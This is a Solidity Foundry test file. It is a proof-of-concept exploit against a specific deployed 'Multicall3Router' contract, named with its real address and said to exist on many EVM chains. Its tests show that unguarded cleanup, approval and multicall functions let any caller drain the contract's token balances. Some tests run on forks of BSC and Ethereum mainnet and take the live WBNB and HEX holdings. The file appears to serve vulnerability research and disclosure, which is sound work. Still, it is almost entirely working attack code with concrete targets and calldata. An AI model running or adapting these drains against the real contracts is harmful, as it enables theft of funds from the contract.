// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";

/// @title Wheelx "Multicall3Router" — unguarded cleanupERC20 (Slice-class T1) on 19 chains
/// @notice Read-only research. Fork / etch only. No transaction is ever signed or broadcast.
/// Target: 0x6222f99443A0d75bd96d40F2904606f60f37cdc2 (Multicall3Router, deterministic-deployed
///         at the SAME address on 19+ EVM chains; identical runtime codehash).
/// The contract exposes, with NO access control:
///   cleanupERC20(address token, address refundTo)              -> sends its WHOLE token balance to refundTo
///   cleanupErc20s(address[],address[],uint256[])               -> same, caller-chosen recipients/amounts
///   safeApproveIfBelow(address token, address spender, uint)   -> grants ANY spender a max allowance
///   safeApprovePermit2(address token, address spender, uint)   -> grants Permit2 allowance to ANY spender
///   safeMultiCall(bytes calls, address refundTo, bytes32 id)   -> delegatecalls multicall3 with caller data
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IMultiCall3Router {
    function cleanupERC20(address token, address refundTo) external;
    function cleanupErc20s(address[] calldata tokens, address[] calldata recipients, uint256[] calldata amounts) external;
    function safeApproveIfBelow(address token, address spender, uint256 amount) external;
    function safeMultiCall(bytes calldata calls, address refundTo, bytes32 request_id) external payable returns (bytes memory);
    function multicall3() external view returns (address);
}

contract MultiCall3RouterDrainTest is Test {
    struct Call {
        address target;
        bytes callData;
    }

    address constant M3R = 0x6222f99443A0d75bd96d40F2904606f60f37cdc2;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // BSC WBNB (holds live dust)
    address constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;  // Ethereum HEX (holds live 1.0 HEX)
    address constant MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

    address attacker = makeAddr("attacker");

    function _rpc(string memory name, string memory fb) internal view returns (string memory) {
        string memory v = vm.envOr(name, string(""));
        return bytes(v).length == 0 ? fb : v;
    }

    function _bscRpc() internal view returns (string memory) {
        return _rpc("BSC_RPC_URL", "https://bsc-rpc.publicnode.com");
    }

    function _ethRpc() internal view returns (string memory) {
        return _rpc("FORK_RPC_URL", "https://ethereum-rpc.publicnode.com");
    }

    function _metisRpc() internal view returns (string memory) {
        return _rpc("METIS_RPC_URL", "https://metis-rpc.publicnode.com");
    }

    // ------------------------------------------------------------------ etch (deterministic)

    function _etch() internal {
        bytes memory code = vm.parseBytes(vm.readFile("runtime/m3r.hex"));
        vm.etch(M3R, code);
        assertEq(M3R.code.length, 4795, "deployed Multicall3Router runtime size");
    }

    /// cleanupERC20(token, refundTo) sends the router's whole token balance to a caller-supplied address.
    function test_etched_cleanupERC20_drainsWholeBalance_toCallerSuppliedRecipient() public {
        _etch();
        MockERC20 tok = new MockERC20();
        tok.mint(M3R, 1000e6);

        vm.prank(attacker);
        IMultiCall3Router(M3R).cleanupERC20(address(tok), attacker);

        assertEq(tok.balanceOf(attacker), 1000e6, "attacker received the whole balance");
        assertEq(tok.balanceOf(M3R), 0, "router emptied");
    }

    /// cleanupErc20s(...) is likewise unguarded and sends the whole balance to caller-chosen recipients.
    function test_etched_cleanupErc20s_drainsWholeBalance() public {
        _etch();
        MockERC20 tok = new MockERC20();
        tok.mint(M3R, 777e6);

        address[] memory tokens = new address[](1);
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(tok);
        recipients[0] = attacker;
        amounts[0] = 0; // 0 => "whole balanceOf(this)"

        vm.prank(attacker);
        IMultiCall3Router(M3R).cleanupErc20s(tokens, recipients, amounts);

        assertEq(tok.balanceOf(attacker), 777e6, "attacker received the whole balance");
    }

    /// safeApproveIfBelow(token, spender, amount) lets ANY caller grant ANY spender a max allowance,
    /// after which the spender pulls the router's balance with transferFrom.
    function test_etched_safeApproveIfBelow_thenTransferFrom_drains() public {
        _etch();
        MockERC20 tok = new MockERC20();
        tok.mint(M3R, 4242e6);

        vm.prank(attacker);
        IMultiCall3Router(M3R).safeApproveIfBelow(address(tok), attacker, type(uint256).max);
        assertEq(tok.allowance(M3R, attacker), type(uint256).max, "max allowance granted to attacker");

        uint256 bal = tok.balanceOf(M3R);
        vm.prank(attacker);
        tok.transferFrom(M3R, attacker, bal);
        assertEq(tok.balanceOf(attacker), 4242e6, "attacker pulled the whole balance");
    }

    // ------------------------------------------------------------------ live forks

    /// BSC: the router holds live WBNB dust. Drain it from an unprivileged EOA (no seeding).
    function test_live_bsc_cleanupERC20_drains_live_dust() public {
        vm.createSelectFork(_bscRpc());
        assertEq(block.chainid, 56, "chainid is BSC");

        uint256 pre = IERC20(WBNB).balanceOf(M3R);
        console2.log("BSC live M3R WBNB balance (wei):", pre);

        vm.prank(attacker);
        IMultiCall3Router(M3R).cleanupERC20(WBNB, attacker);

        assertEq(IERC20(WBNB).balanceOf(attacker), pre, "attacker received the whole live balance");
        assertEq(IERC20(WBNB).balanceOf(M3R), 0, "router emptied");
    }

    /// Ethereum: the router holds live HEX + 1-wei stETH/eETH dust. Drain HEX from an unprivileged EOA.
    function test_live_ethereum_cleanupERC20_drains_live_dust() public {
        vm.createSelectFork(_ethRpc());
        assertEq(block.chainid, 1, "chainid is Ethereum");

        uint256 pre = IERC20(HEX).balanceOf(M3R);
        console2.log("ETH live M3R HEX balance (1e8):", pre);

        vm.prank(attacker);
        IMultiCall3Router(M3R).cleanupERC20(HEX, attacker);

        assertEq(IERC20(HEX).balanceOf(attacker), pre, "attacker received the whole live balance");
        assertEq(IERC20(HEX).balanceOf(M3R), 0, "router emptied");
    }

    /// BSC: safeMultiCall() delegatecalls multicall3 with fully caller-supplied calldata, so an
    /// attacker can make the router transfer ANY asset it holds (ERC-20 / ERC-721 / ERC-1155).
    function test_live_bsc_safeMultiCall_arbitraryTransfer() public {
        vm.createSelectFork(_bscRpc());
        assertEq(IMultiCall3Router(M3R).multicall3(), MULTICALL3, "multicall3 immutable");

        uint256 pre = IERC20(WBNB).balanceOf(M3R);
        console2.log("BSC live M3R WBNB balance (wei):", pre);

        // multicall3.aggregate((address,bytes)[]) — each Call = (target, callData)
        Call[] memory calls = new Call[](1);
        calls[0] = Call({target: WBNB, callData: abi.encodeWithSelector(IERC20.transfer.selector, attacker, pre)});
        bytes memory data = abi.encodeWithSelector(bytes4(0x252dba42), calls); // aggregate((address,bytes)[])

        vm.prank(attacker);
        IMultiCall3Router(M3R).safeMultiCall(data, attacker, bytes32(0));

        assertEq(IERC20(WBNB).balanceOf(attacker), pre, "attacker received the whole live balance via safeMultiCall");
        assertEq(IERC20(WBNB).balanceOf(M3R), 0, "router emptied");
    }

    /// Metis (the named target): selector present, native 0, no token balances today; a seeded
    /// balance is instantly drainable by an unprivileged EOA.
    function test_live_metis_selector_present_balances_zero_and_seeded_drain() public {
        vm.createSelectFork(_metisRpc());
        assertEq(block.chainid, 1088, "chainid is Metis");

        bytes memory code = M3R.code;
        assertTrue(_contains(code, hex"3dad0c9c"), "cleanupERC20(address,address) selector present");
        assertTrue(_contains(code, hex"5e069ba5"), "safeApproveIfBelow(address,address,uint256) selector present");
        assertTrue(_contains(code, hex"e13157f5"), "safeApprovePermit2(address,address,uint256) selector present");
        assertEq(M3R.balance, 0, "native balance 0");

        MockERC20 tok = new MockERC20();
        tok.mint(M3R, 1234e6);
        assertEq(tok.balanceOf(M3R), 1234e6);

        vm.prank(attacker);
        IMultiCall3Router(M3R).cleanupERC20(address(tok), attacker);
        assertEq(tok.balanceOf(attacker), 1234e6, "attacker drained the seeded balance on Metis");
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length > haystack.length) return false;
        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool ok = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    ok = false;
                    break;
                }
            }
            if (ok) return true;
        }
        return false;
    }
}
